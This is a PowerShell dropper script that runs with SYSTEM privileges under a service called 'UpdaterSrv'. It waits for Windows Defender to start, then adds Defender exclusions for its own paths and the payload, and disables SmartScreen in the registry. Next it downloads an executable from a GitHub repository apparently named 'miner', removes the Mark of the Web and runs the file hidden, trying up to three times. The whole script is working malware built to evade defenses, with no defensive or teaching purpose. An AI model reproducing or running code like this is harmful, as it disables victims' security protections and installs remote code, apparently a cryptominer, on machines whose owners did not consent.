# ----------------------------------------
# script.ps1 (Optimized for LocalSystem Service Execution)
# This script will be executed with SYSTEM privileges by your UpdaterSrv.
# It adds Windows Defender exclusions, disables SmartScreen, and fetches/executes an .exe payload.
# ----------------------------------------
Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path $logPath -Parent

# Ensure the log directory exists
if (-not (Test-Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

# --- NEW ADDITION: Ensure ServicesPipeTimeout is set for reliable service startup ---
$servicesPipeTimeoutPath = "HKLM:\SYSTEM\CurrentControlSet\Control"
$servicesPipeTimeoutName = "ServicesPipeTimeout"
$desiredTimeoutMs = 120000 # 120 seconds (2 minutes) - adjust as needed

Add-Content -Path $logPath -Value "Checking and setting ServicesPipeTimeout in registry..."

try {
    $currentTimeout = Get-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -ErrorAction SilentlyContinue
    if (-not $currentTimeout -or $currentTimeout.$servicesPipeTimeoutName -lt $desiredTimeoutMs) {
        Set-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -Value $desiredTimeoutMs -Force -ErrorAction Stop
        Add-Content -Path $logPath -Value "ServicesPipeTimeout set to ${desiredTimeoutMs}ms. A reboot is required for this change to fully take effect for service startups."
    } else {
        Add-Content -Path $logPath -Value "ServicesPipeTimeout is already set to $($currentTimeout.$servicesPipeTimeoutName)ms (or higher than desired ${desiredTimeoutMs}ms)."
    }
} catch {
    Add-Content -Path $logPath -Value "Error setting ServicesPipeTimeout: $_"
}
# --- END NEW ADDITION ---

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."

# --- Optional: Verify Admin Status (for logging/debugging) ---
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges. Commands might fail."
    # This block should ideally not be hit if UpdaterSrv runs as LocalSystem.
}

# --- START: Adaptive Wait for Windows Defender Service to be ready ---
Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready before adding exclusions..."
$maxAttempts = 20 # Check up to 20 times (20 * 5 seconds = 100 seconds max wait)
$delayBetweenChecks = 5 # seconds between each check

for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        # Check if the WinDefend service is running and Real-time Protection is enabled
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue

        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
            break # Exit loop if Defender is ready
        }
    } catch {
        # Catch errors if service isn't found or Get-MpComputerStatus fails
        Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
    }
    
    # If not ready, wait and try again
    Start-Sleep -Seconds $delayBetweenChecks

    if ($i -eq ($maxAttempts - 1)) {
        # This is the last attempt, log a warning if still not ready
        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions anyway."
    }
}
Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
# --- END: Adaptive Wait ---

# --- Add Windows Defender Exclusions ---
Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

$exclusions = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\updater.exe",
    "C:\ProgramData\WinKit"
)

foreach ($excl in $exclusions) {
    try {
        $currentExclusions = Get-MpPreference
        
        # Check if exclusion path already exists
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        # Check if exclusion process already exists
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        
        # Check for extension if applicable (e.g., for ".exe")
        $ext = [System.IO.Path]::GetExtension($excl).TrimStart(".")
        $extensionExists = $false
        if ($ext) {
            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $ext }) -ne $null
        }

        if (-not ($pathExists -or $processExists -or ($ext -and $extensionExists))) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
            if ($ext) {
                Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
            }
            Add-Content $logPath "Exclusion added: $excl"
        } else {
            Add-Content $logPath "Exclusion already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath "Failed to add exclusion: $excl - Error: $_"
    }
}
Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

# --- Fetch and Execute Payload ---
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe" # <-- IMPORTANT: REPLACE WITH YOUR GITHUB RELEASE DIRECT LINK
$payloadPath = "C:\Windows\Temp\updater.exe"

Add-Content -Path $logPath -Value "Attempting to disable SmartScreen, fetch, and execute .exe payload from $payloadUrl."

try {
    # Disable SmartScreen via registry
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    try {
        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
    } catch {
        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
        # Continue execution, as SmartScreen may already be disabled or restricted by Group Policy
    }

    # Verify SmartScreen status for logging
    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
    } else {
        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
    }

    # Ensure payload directory exists
    if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
        New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
        Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path $payloadPath -Parent)."
    }

    # Download the .exe payload using Invoke-WebRequest
    Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
    $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
    Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"

    # Log downloaded file size for reference
    $downloadedSize = (Get-Item $payloadPath).Length
    Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."

    # Verify file is an executable (check for MZ header)
    $fileBytes = Get-Content $payloadPath -Raw -Encoding Byte -ReadCount 0 | Select-Object -First 2
    if ($fileBytes -notlike @(77, 90)) { # MZ signature for .exe
        throw "Downloaded file is not a valid executable (invalid MZ signature)."
    }
    Add-Content -Path $logPath -Value "Downloaded file appears to be a valid executable (MZ signature verified)."

    # Remove Mark of the Web to further reduce SmartScreen triggers
    try {
        Unblock-File -Path $payloadPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
    } catch {
        Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
    }

    # Execute the .exe silently with up to 3 attempts
    $maxAttempts = 3
    $retryDelay = 5 # Seconds between attempts
    $success = $false

    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        try {
            Add-Content -Path $logPath -Value "Attempting to execute payload (Attempt $attempt of $maxAttempts)..."
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
            Add-Content -Path $logPath -Value "Payload executed successfully on attempt $attempt."
            $success = $true
            break
        } catch {
            Add-Content -Path $logPath -Value "Execution failed on attempt $attempt: $_"
            if ($attempt -lt $maxAttempts) {
                Add-Content -Path $logPath -Value "Waiting $retryDelay seconds before retrying..."
                Start-Sleep -Seconds $retryDelay
            }
        }
    }

    if (-not $success) {
        throw "Failed to execute payload after $maxAttempts attempts."
    }

} catch {
    Add-Content -Path $logPath -Value "Failed to disable SmartScreen, fetch, or execute payload from $payloadUrl. Error: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
